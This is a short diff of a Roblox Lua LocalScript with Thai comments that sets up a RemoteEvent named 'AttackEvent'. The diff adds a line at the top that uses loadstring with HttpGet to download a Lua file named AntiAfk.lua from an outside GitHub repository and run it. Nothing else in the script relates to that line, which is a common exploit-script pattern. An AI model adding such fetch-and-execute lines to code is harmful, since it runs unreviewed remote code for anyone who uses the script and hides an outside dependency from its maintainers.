@@ -1,3 +1,5 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Proxylol/OtherScripts/main/AntiAfk.lua'),true))()
+
 -- LocalScript (เช่น อยู่ใน StarterPlayerScripts)
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local attackEvent = ReplicatedStorage:WaitForChild("AttackEvent") -- สมมุติ RemoteEvent ชื่อ AttackEvent
